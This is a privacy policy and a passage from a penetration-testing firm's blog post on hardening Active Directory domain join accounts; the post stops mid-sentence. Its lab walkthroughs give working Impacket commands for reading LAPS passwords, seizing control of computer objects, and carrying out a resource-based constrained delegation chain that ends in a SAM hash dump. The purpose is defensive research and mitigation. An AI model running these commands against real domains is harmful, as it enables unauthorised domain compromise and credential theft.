[{"authors":null,"categories":null,"content":"Shelltrail AB, org.no. 559319-6164 (hereinafter denoted Shelltrail) is a Swedish based cybersecurity company predominantly active in the offensive IT security industry. This document is the privacy policy of Shelltrail, which explains how our organization uses the personal data we collect, use, maintain and disclose when you or the company you work for buys or uses the services we provide or when you contact us.\nTopics What data do we collect? How do we collect your data? How will we use your data? How do we store your data? Marketing What are your data protection rights? How do we use cookies? Privacy policies of other websites Changes to our privacy policy How to contact us How to contact the appropriate authorities What data do we collect? Shelltrail collects and processes data in order to be able to provide our services to you. The data is either provided by you or your employer as part of the delivery of a service, or as a means to contact you for future service offerings. Shelltrail collects the following data:\nWhen submitting data using our contact form\nIdentity information (name) Contact information (email address) As part of the delivery of our services\nIdentity information (name, title, company) Contact information (email address, telephone number) How do we collect your data? The data is collected by Shelltrail in the following ways:\nWhen submitting data using our contact form\nWhen submitting data using our contact form, the data is sent to a third-party provider (Cloudflare), which generates an email.\nAs part of the delivery of our services\nAs part of the delivery of our services, you or your employer may supply contact information.\nHow will we use your data? Shelltrail collects the data in order to communicate with you regarding your intention to get more information about our services or as part of an ongoing assignment.\nShelltrail also uses the data to verify your identity and authority to act on behalf of your employer or the organization you are representing.\nHow do we store your data? Shelltrail stores data in the following ways, depending on the way it has been retrieved:\nWhen submitting data using our contact form\nWhen submitting data using our contact form, the data is sent to a third-party provider (Cloudflare), which generates an email using Mailgun. This email is stored in an email inbox (gmail.com).\nAs part of the delivery of our services\nThe contact information supplied as part of the delivery of our services may either be stored in an email inbox (gmail.com) or in an encrypted ephemeral virtual machine, used solely for the purpose of the assessment.\nMarketing Shelltrail does not use the supplied information for marketing purposes.\nWhat are your data protection rights? Shelltrail would like to make sure you are fully aware of all of your data protection rights. Every user is entitled to the following:\nThe right to access - You have the right to request Shelltrail for copies of your personal data. The right to rectification - You have the right to request that Shelltrail corrects any information you belive is inaccurate. You also have the right to request Shelltrail to complete the information you belive is incomplete. The right to erasure - You have the right to request that Shelltrail erase your personal data, under certain conditions. The right to restrict processing - You have the right to object to Shelltrail\u0026rsquo;s processing of your personal data, under certain conditions. The right to data portability - You have the right to request that Shelltrail transfer all the data we have collected to another organization, or directly to you, under certain circumstances. If you make a request, we have one month to respond to you. If you would like to exercise any of these rights, please contact us at our email: privacy@shelltrail.com\nHow do we use cookies? Cookies are text files placed on your computer to collect standard Internet log information and visitor behavior information.\nShelltrail does not make use of cookies.\nPrivacy policies of other websites The Shelltrail website may contain links to other websites. Our privacy policy applies only to our website, so if you click on a link to another website, you should stay informed of their privacy policy.\nChanges to our privacy policy Shelltrail keep its privacy policy under regular review and places any updates on this web page. The privacy policy was last updated on 7th of August 2025.\nHow to contact us If you have any questions about Shelltrail\u0026rsquo;s privacy policy, the data we hold on you, or you would like to exercise one of your data protection rights, please do not hesitate to contact us.\nEmail: privacy@shelltrail.com\nAddress: Bredgatan 4, 21130, Malmö, Sweden\nHow to contact the appropriate authority Should you wish to report a complaint or if you feel that Shelltrail has not addressed your concern in a satisfactory manner, you may contact the Swedish Authority for Privacy Protection (IMY) https://www.imy.se.\n","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"0d173721cd0504c2391e2984cbee578c","permalink":"https://www.shelltrail.com/privacy-policy/privacy-policy/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/privacy-policy/privacy-policy/","section":"privacy-policy","summary":"Shelltrail AB, org.no. 559319-6164 (hereinafter denoted Shelltrail) is a Swedish based cybersecurity company predominantly active in the offensive IT security industry. This document is the privacy policy of Shelltrail, which explains how our organization uses the personal data we collect, use, maintain and disclose when you or the company you work for buys or uses the services we provide or when you contact us.\nTopics What data do we collect? How do we collect your data?","tags":null,"title":"Shelltrail Privacy Policy","type":"privacy-policy"},{"authors":null,"categories":null,"content":" TL;DR Domain join accounts are frequently exposed during build processes, and even when following Microsoft\u0026rsquo;s current guidance they inherit over-privileged ACLs (ownership, read-all, account restrictions) that enable Legacy-LAPS disclosure, RBCD and other high-impact abuses.\nHardening requires layering controls such as disallowing low privileged users to create machine accounts and ensure that Domain Admins own joined computer objects. In addition, add deny ACEs for Legacy-LAPS (ms-Mcs-AdmPwd) and RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) while scoping create/delete rights to specific OUs.\nEven with those mitigations, reset-password rights can be weaponised via replication lag plus AD CS to recover the pre-reset machine secret.\nDig into this post to see the lab walkthroughs, detection pointers and scripts that back these claims.\nThe problem with domain join accounts During Shelltrail\u0026rsquo;s many Active Directory Security Assessments 13 times out of 12 we end up compromising the Active Directory some way or another through the Active Directory domain join-account. By the looks of it, this account is nothing fancy. It is a regular active directory user account which is provided some additional permissions in order to create computer accounts and join/re-join computers to the Active Directory domain.\nThe reason it is such a common way to compromise the Active Directory is the combination of its exposure and the way Access Control Entries (ACE) works in Active Directory.\nThink about it; a Help Desk technician opens a Lenovo box, pulls out a brand new laptop. PXE boots the machine, hits F12, chooses Windows 11, grabs a cup of coffee and a croissant, then 45 minutes later the laptop is fully installed, joined to the domain and set up with all enterprise tooling.\nThe Laptop here is an unauthenticated device, i.e., an unauthenticated attack perspective. And it is handed the plain-text password of the domain join account in order to join the domain. This basically means that an attacker on the internal network of a company is one press of F12 away from the domain join account\u0026rsquo;s password.\nThe exposure of domain join accounts There are multiple ways of gaining access to the domain join account and the following list highlights a few:\nPXE boot and task sequences unattend.xml files MDT CustomSettings.ini bat, cmd or ps1 scripts stored in Configuration Managers CMSources Stored in configuration files obtained with cmloot.py Previous research Shelltrail\u0026rsquo;s pentester Andreas Vikerup has previously researched the problems with Active Directory domain join accounts which highlighted that ACEs in Active Directory tied to domain join accounts behave in unexpected ways and most often result in over-privileged permissions when attempting to configure or limit them.\nTrusted, good sources for gaining information on how to configure the domain join permissions have been sparse. This led to contacting Microsoft Security Response Center (MSRC) in an attempt to encourage Microsoft themselves to provide good security guidelines.\nMicrosoft\u0026rsquo;s response back in October 2021 was:\nHello,\nWe have completed our investigation and determined that this issue does not meet MSRC\u0026rsquo;s bug bar for a security update.\nThis led administrators to rely on blogs and other unverified sources to set up one of the most exposed Active Directory accounts in their environment.\n4 years later\u0026hellip; By chance, this came up during a Google search (article date 25th Aug 2025):\nWe acknowledge and know that managing domain join account permissions is hard - but Shelltrail is very happy that Microsoft takes action and provides guidance in this matter.\nThe continuation of this article will put to the test the recommendations that Microsoft highlight. Follow along!\nThe domain join account By default both regular users and high-privilege users (Domain Admins) are allowed to join computers to the domain. Regular users are however capped to joining maximum 10 machines.\nWhen a regular user joins a computer to the domain (in other words: creates a new computer object) the owner of the object will default to Domain Admins. The same concept also applies when a high-privileged user joins a computer.\nNote that we do not want to use high privileged accounts for domain join actions as this username and password must be stored and pushed to the devices if for instance Configuration Manager is used to deploy operating systems.\nBut using a regular, default configured, user account for domain join actions will quickly reach the cap of 10 machine accounts.\nTo solve this - a specially configured Active Directory user account should be created and used in task sequences - we will call this the domain join-account.\nMachine Account Quota All information in this article will be summarized in the end in a nice, neat to-do list which should help create a reasonably secure domain join account.\nBut first off, we need to address the limit of 10 computer accounts which in Active Directory is controlled by the ms-DS-MachineAccountQuota. This is recommended to be set to 0, which limits any low privileged account to create computer objects and thereby mitigating multiple attack vectors that requires computer accounts. This setting is not covered in Microsoft\u0026rsquo;s Active Directory domain join permissions article but for the completeness of this guide we will include it:\nSet-ADDomain -Identity test.local -Replace @{ \u0026#39;ms-DS-MachineAccountQuota\u0026#39; = 0 } -Verbose VERBOSE: Performing the operation \u0026#34;Set\u0026#34; on target \u0026#34;DC=test,DC=local\u0026#34;. Awesome, now only the following users can create new computer objects:\nUsers in the Administrators or Domain Administrators groups. Users who have delegated permissions on containers in Active Directory to create and delete computer accounts. user@adpen1:~$ addcomputer.py test.local/test-lowpriv:$PASS -computer-name NEWCOMPUTER\\$ -computer-pass Abcdef12345 Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [-] Authenticating account\u0026#39;s machine account quota exceeded! Understanding Microsoft\u0026rsquo;s domain join article Begin with reading through the full article https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/active-directory-domain-join-permissions.\nThen we\u0026rsquo;ll discuss the necessary parts, namely the two scenarios:\nScenario 1: Permissions for creating computer accounts,\nThis scenario applies when users join their own computers to the domain without prior provisioning of computer accounts. During domain join, if the computer account with the name you\u0026rsquo;re joining doesn\u0026rsquo;t exist in AD, the system creates it using an Ldap_Add() operation, performed with the provided user credentials. To learn more, see NetJoinDomain function (lmjoin.h). The user joining the computer must either have the Add workstations to domain user right (also known as SeMachineAccountPrivilege, managed by Ms-Ds-Machine-Account-Quota), or permission to create computer objects in the organizational unit (OU) or container where the account is created. Because of the vulnerabilities described in Add workstations to domain, Microsoft doesn\u0026rsquo;t recommend using this option.\nThis basically explains that low privileged users should not be allowed to create computer accounts as it introduces security risks. This is exactly what we mitigated with the MachineAccountQuota setting. Well done friend, we are one step ahead.\nScenario 2: Reusing computer accounts during domain join,\nA more common scenario involves domain joining a device with a precreated computer account. For example, Admin01 at contoso.com has the Create Computer Account permissions on OU=Workstations,DC=Contoso,DC=com\nA more common scenario is up for discussion. Pre-creating all computer accounts creates more overhead prior to deploying machines. Well well, let\u0026rsquo;s continue.\nAdmin01 creates a computer account in the Workstations OU called NewPC1 and Admin02 needs to join this computer to the domain during the build process. In cases where troubleshooting is necessary, such as when Admin03 needs to unjoin and rejoin a computer, the preexisting account eases this process.\nSo the recommended approach is to use three accounts for our operating system deployment now?\nAdmin01 - To pre create computer accounts Admin02 - To join computers to the domain (What we call domain join account in this article) Admin03 - To unjoin/rejoin machines to the domain When an account with the name NewPC1$ exists in AD, an Ldap_modify() operation is executed using the credentials of the user handling the join, like Admin02@contoso.com.\nThis tells us that our domain join account needs modify rights on the computer objects in Active Directory.\nWhen you perform the offline domain join process (djoin /requestODJ), the join doesn\u0026rsquo;t require any permissions on the computer account in AD. This method is recommended because it minimizes required AD privileges and reduces potential issues.\nThe previous excerpt is interesting. Microsoft recommends usage of offline domain join (ODJ). This scenario requires a user to pre-creating the computer object in Active Directory, where the user would be our domain join account. While creating the object, a random 120 character password is set as the machine account password. This password, as well as other domain specific information is stored in a base64 encoded blob. A djoin.exe command together with the base64 blob can join a workgroup computer to the Active Directory. Meaning that no permissions are needed during this scenario, at least not during the time of the join action. We will not delve further into this topic but it could be a fun research project ahead.\nAs far as we know there is no official support to integrate offline domain join and the automatic pre-creating of computer objects in Configuration Manager task sequences. Until then, we will not consider this option for an operative system deployment process.\nTo successfully reuse an existing computer account during domain join, ensure the following permissions are assigned:\nTrusted Ownership: The computer account owner (Admin01) must be a member of the Administrators group, either directly or through nested group membership. Alternatively, the user performing the domain join (Admin01) must be the account owner. If KB5020276 - Netjoin: Domain join hardening changes is installed, the owner (Admin01) or a group that includes Admin01 must be listed as a trusted owner in the ComputerAccountReuseAllowlist Group Policy Object (GPO) as described in the KB. Ah, ownership. This is the main fundamental issue with domain join accounts that was reported to Microsoft back in 2022. More on this later.\nThe rest of the article states permissions to successfully join a computer to the domain using an existing account.\nFollowing Microsoft permission guidelines First off we need to create our dedicated domain join user:\nWe will follow Scenario 2 in Microsoft\u0026rsquo;s guidelines as we want to be able to reinstall machines with our Configuration Manager environment.\nWe assign all of these permissions to CN=Computers,OU=test,OU=local and limit the assignments to Descendant Computer Objects:\nRead all properties List contents Change password Reset password Write account restrictions (for updating UserAccountControl) Validated write to DNS host name Validated write to service principal name Allowed to authenticate Write computername (pre-Windows 2000) Write displayname (Not found ACE - skipping) Write description We test out our assigned permissions with addcomputer.py from impacket:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name NEWCOMPUTER\\$ Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies [-] Authenticating account\u0026#39;s machine account quota exceeded! Remember?:\nThe user joining the computer must either have the Add workstations to domain user right (also known as SeMachineAccountPrivilege)\nWe must now choose whether deletion of computer accounts should be delegated to our domain join account. If we allow it - the account will be able to unjoin machines from the domain and clean up afterwards as well - however this also allows an attacker to wipe all computer accounts if the domain join account should be compromised. We aim for a hardened environment and thereby do not allow deletion of accounts:\nAll permissions assigned to an object in Active Directory is stored in the nTSecurityDescriptor:\nuser@adpen1:~$ pyldapsearch test.local/domainjoin:$PASS \u0026#39;(\u0026amp;(objectcategory=container)(name=Computers))\u0026#39; -attributes nTSecurityDescriptor Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] pyldapsearch v0.1.7 - Tw1sm [*] Binding to test.local [*] Distinguished name: DC=test,DC=local [*] Filter: (\u0026amp;(objectcategory=container)(name=Computers)) [*] Returning specific attributes(s): nTSecurityDescriptor -------------------- nTSecurityDescriptor: AQAEjMAMAADcDAAAAAAAABQAAAAEAKwMPQAAAAUKSAAAAQAAAwAAAFMacqsvHtARmBkAqgBAUpuGepa/5g3QEaKFAKoAMEniAQUAAAAAAAUVAAAAcafBLzep2eUtpPgmZAQAAAUKSAAAAQAAAwAAAHCVKQBtJNA.... The nTSecurityDescriptor stores its data in binary (SDDL) format which is not human readable. However @p0dalirius has created pyDescribeNTSecurityDescriptor to parse the data, which comes in handy when reviewing ACLs with python:\nuser@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=computers,DC=test, [\u0026gt;] Try to authenticate as \u0026#39;test.local\\domainjoin\u0026#39; on None ... 001. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right USER_CHANGE_PASSWORD (inherited from the LDAP Attribute computer), by inheritance. 002. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right USER_FORCE_CHANGE_PASSWORD (inherited from the LDAP Attribute computer), by inheritance. 003. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right ALLOWED_TO_AUTHENTICATE (inherited from the LDAP Attribute computer), by inheritance. 004. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES (inherited from the LDAP Attribute computer), by inheritance. 005. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName (inherited from the LDAP Attribute computer), by inheritance. 008. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my LDAP Attribute description (inherited from the LDAP Attribute computer), by inheritance. 009. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer), by inheritance. 010. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Create Child on my LDAP Attribute computer, by inheritance. 017. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to List Contents, Read on me (inherited from the LDAP Attribute computer), by inheritance. A couple of improvements were done in pyDescribeNTSecurityDescriptor during this research. View here.\nWe test to add a computer to the domain again:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name NEWCOMPUTER\\$ Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Successfully added machine account NEWCOMPUTER$ with password KvgMCaWyA1dyNFHIsVTsLrMABdCdiPiN. Perfect. We now have the ability to join the domain.\nBut even though we have followed the best practices, the permissions we now have assigned our domain join account is over privileged and if a compromise of this account occurs the attacker will have multiple ways of compromise the chosen targets.\nLet\u0026rsquo;s step through them one by one highlighting the risk of each permission, and attempt to provide mitigating factors.\nRead all properties Easy to exploit. Reading all properties means that we can read the Legacy-LAPS password if present from the ms-Mcs-AdmPwd attribute:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # get_laps_password NEWCOMPUTER$ Found Computer DN: CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local LAPS Password: lwNImJjCtsjKeXmldLVm/zJwSoiGItpi Agreed that the domain join account should have read permissions on the object but all properties - including sensitive ones seem overpowered.\nSo we remove Read all properties from our delegate permissions.\nA note on ldap_shell.py. @PShlyundin has a fork of ldap_shell in an external repo of impacket. During this research me and my friend Chad Gepete rewrote the client from scratch and sent a pull request to impacket\u0026rsquo;s main project. Previously ldap_shell was a class in impacket which only was accessible by running for instance ntlmrelayx.py and initiating a smbclient.py to 127.0.0.1 in order to reach the interactive ldap_shell menu. Not anymore.\nOwnership As we have delegated permission specifically to our domain join account to allow creation of computer objects a key difference in the ownership of the computer account occurs. If a high privileged user has joined the computer to the domain, Domain Admins becomes the owner:\nIf however a domain join account has been delegated permission to join the computer it itself becomes the owner:\nThis is simple to exploit as you can now assign yourself full rights to the computer object and perform Legacy-LAPS read, Resource Based Constrained Delegation (RBCD) or Shadow Credentials:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # grant_control NEWCOMPUTER$ domainjoin Resolved \u0026#39;domainjoin\u0026#39; to \u0026#39;S-1-5-21-801220465-3856247095-653829165-1124\u0026#39; Resolved \u0026#39;(sAMAccountName=NEWCOMPUTER$)\u0026#39; to \u0026#39;CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local\u0026#39; DACL modified successfully! \u0026#39;domainjoin\u0026#39; now has control of \u0026#39;CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local\u0026#39; The ownership of a machine is represented by the last line (Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER, which was added to the DescribeNTSecurityDescriptor.py in commit 082d094):\nuser@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local | grep domainjoin [\u0026gt;] Try to authenticate as \u0026#39;test.local\\domainjoin\u0026#39; on None ... 001. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my Property Set LOGON_INFORMATION (inherited from the LDAP Attribute computer), by inheritance. 002. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my LDAP Attribute description (inherited from the LDAP Attribute computer), by inheritance. 003. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my LDAP Attribute displayName (inherited from the LDAP Attribute computer), by inheritance. 004. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my LDAP Attribute sAMAccountName (inherited from the LDAP Attribute computer), by inheritance. 005. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES, by inheritance. 006. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName, by inheritance. 007. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS, by inheritance. 015. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to List Contents, Read, Delete Tree, List Object, Control Access, Delete, Read Control on me, by inheritance. 021. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right USER_CHANGE_PASSWORD (inherited from the LDAP Attribute computer) 022. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right USER_FORCE_CHANGE_PASSWORD (inherited from the LDAP Attribute computer) 023. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Control Access on my Extended Right ALLOWED_TO_AUTHENTICATE (inherited from the LDAP Attribute computer) 024. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES (inherited from the LDAP Attribute computer) 025. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName (inherited from the LDAP Attribute computer) 026. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Read, Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer) 027. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Create Child, Delete Child on my LDAP Attribute computer 042. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER This will be mitigated if the owner of the computer account is changed during an action in the deployment process. We change our owner manually to Domain Admins and continue.\nRead all permission\u0026hellip; again? Did you see entry 015. in DescribeNTSecurityDescriptor.py?\n015. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to List Contents, Read, Delete Tree, List Object, Control Access, Delete, Read Control on me, by inheritance. Read on me. Yep, we can read Legacy-LAPS passwords again:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # get_laps_password NEWCOMPUTER$ Found Computer DN: CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local LAPS Password: lwNImJjCtsjKeXmldLVm/zJwSoiGItpi But we have mitigated this vulnerability by removing Read all properties from the CN=Computers,OU=test,OU=local container right?\nWhen looking through all permissions, Read all properties is once again set to our domain join account but it is not inherited:\nAfter a while of digging, the explanation is that the default security descriptor of newly created computer object assigns the Creator/Owner with read properties:\nuser@adpen1:~$ pyldapsearch test.local/domainjoin:$PASS \u0026#39;(cn=Computer)\u0026#39; -base-dn \u0026#34;CN=Schema,CN=Configuration,DC=test,DC=local\u0026#34; -attributes defaultSecurityDescriptor Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] pyldapsearch v0.1.7 - Tw1sm [*] Binding to test.local [*] Distinguished name: CN=SCHEMA,CN=CONFIGURATION,DC=TEST,DC=LOCAL [*] Filter: (cn=Computer) [*] Returning specific attributes(s): defaultSecurityDescriptor -------------------- defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPCRLCLORCSDDT;;;CO)(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;CO)(A;;RPLCLORC;;;AU)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(A;;CCDC;;;PS)(OA;;CCDC;bf967aa8-0de6-11d0-a285-00aa003049e2;;PO)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;PS)(OA;;RPWP;77B5B886-944A-11d1-AEBD-0000F80367C1;;PS)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;PS)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;CO)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;CO)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560) What we find here is the security descriptor (A;;RPCRLCLORCSDDT;;;CO) which means:\nField Meaning (A;;...;;;CO) Allow ACE applying to Creator Owner RP Read Properties - allows reading all readable attributes on the object (also includes CR, LC, LO, RC, SD, DT) Other rights, but the RP flag specifically grants read access to object properties And this is when the mitigation gets tricky. Either we do rocket surgery on the inner workings of Active Directory or we attempt to implement Deny ACEs.\nWe choose ACEs..\nActive Directory ACEs can either Allow or Deny. Deny will have precedence over Allow. Awesome, easy to remember.\nBut this only applies when the Deny is applied at the same (or stricter) level as the Allow. And Read all properties is applied directly on the object. A.K.A the most strictiestest.\nThis means that we cannot add Deny read on ms-Mcs-AdmPwd attribute at the root level in order to Deny read on specific properties.\nSo if we would take a scenario where we attempt to Deny/Allow an attribute these precedence rules will apply:\nOU=test,OU=local/ CN=Computers/ CN=PC01 Result Allow Allow Allow Allow read Deny Allow Allow Allow read Deny Deny Allow Allow read Deny Deny Deny Deny read Allow Allow Deny Deny read Allow Allow Deny and Allow Deny read So to mitigate Legacy-LAPS read we need to do a post-deploy or scheduled run of a script that assigns Deny read on the ms-Mcs-AdmPwd attribute for our domain join account directly on the object:\n# ---- SETTINGS ---- $entity = \u0026#34;domainjoin\u0026#34; $guid = \u0026#34;ad27bc2b-cf04-424d-b705-5df50c7d5d37\u0026#34; # ms-Mcs-AdmPwd $property = \u0026#34;ReadProperty\u0026#34; $permission = \u0026#34;Deny\u0026#34; # ------------------- # Define the ACE properties $adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property $objectType = New-Object Guid $guid # GUID for the specific property $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) # Create the ACE $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Get ALL computer objects in the forest root domain and apply the deny $computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName foreach($computer in $computerDNs){ # Get the current ACL of the computer object $acl = Get-ACL \u0026#34;AD:$computer\u0026#34; # Add the new ACE to the ACL $acl.AddAccessRule($ace) # Set the modified ACL back to the computer object Set-ACL -Path \u0026#34;AD:$computer\u0026#34; -AclObject $acl } Success:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # get_laps_password SRV01$ Found Computer DN: CN=SRV01,CN=Computers,DC=test,DC=local Unable to Read LAPS Password for Computer The hidden Write Extended Properties (write on msDS-AllowedToActOnBehalfOfOtherIdentity) As a regular pentester of Active Directory the exploitation of Resource Based Constrained Delegation is a common way to compromise a remote machine by having write access to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the computer account.\nJust to make sure our setup is hardened we test to write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute with our domain join account:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # set_rbcd DEMOMACHINE$ asdf$ Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local Target SID: S-1-5-21-801220465-3856247095-653829165-1204 Found Grantee DN: CN=asdf,CN=Computers,DC=test,DC=local Grantee SID: S-1-5-21-801220465-3856247095-653829165-1190 Currently allowed sids: Delegation rights modified successfully! asdf$ can now impersonate users on DEMOMACHINE$ via S4U2Proxy Oh (no|yes) - we have the privileges to perform RBCD\u0026hellip;\nWithout going in depth of the RBCD exploitation technique the following commands show how to compromise the remote machine:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name RBCD\\$ -computer-pass Password123 Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Successfully added machine account RBCD$ with password Password123. user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # set_rbcd DEMOMACHINE$ RBCD$ Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local Target SID: S-1-5-21-801220465-3856247095-653829165-1182 Found Grantee DN: CN=RBCD,CN=Computers,DC=test,DC=local Grantee SID: S-1-5-21-801220465-3856247095-653829165-1205 Currently allowed sids: S-1-5-21-801220465-3856247095-653829165-1188 Delegation rights modified successfully! RBCD$ can now impersonate users on DEMOMACHINE$ via S4U2Proxy # exit user@adpen1:~$ getST.py -spn \u0026#39;cifs/DEMOMACHINE\u0026#39; -dc-ip \u0026#39;100.64.5.200\u0026#39; \u0026#39;test.local/RBCD:Password123\u0026#39; -impersonate test-admin Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating test-admin [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in test-admin@cifs_DEMOMACHINE@TEST.LOCAL.ccache user@adpen1:~$ KRB5CCNAME=~/test-admin@cifs_DEMOMACHINE@TEST.LOCAL.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x42258c136f02241902f170cf6037bed7 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) [...] After reviewing all ACLs assigned to our domain join account no one explains why we can write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute:\nAfter reviewing all ACLs on the computer object and switching them to Deny one-by-one it was found that Write Account Restrictions was the ACL providing write to msDS-AllowedToActOnBehalfOfOtherIdentity:\nWhich is represented by Write on my Property Set ACCOUNT_RESTRICTIONS in DescribeNTSecurityDescriptor.py\nuser@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=DEMOMACHINE,CN=Computers,DC=test,DC=local | grep -i domainjoin | grep ACCOUNT_RESTRICTIONS 010. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS, by inheritance. 031. \u0026#39;TEST.LOCAL\\domainjoin\u0026#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer) Write account restriction is actually added two times on the computer object which our domain join account has created.\nOnce per inheritance and recommended by Microsoft:\nAnd once per default 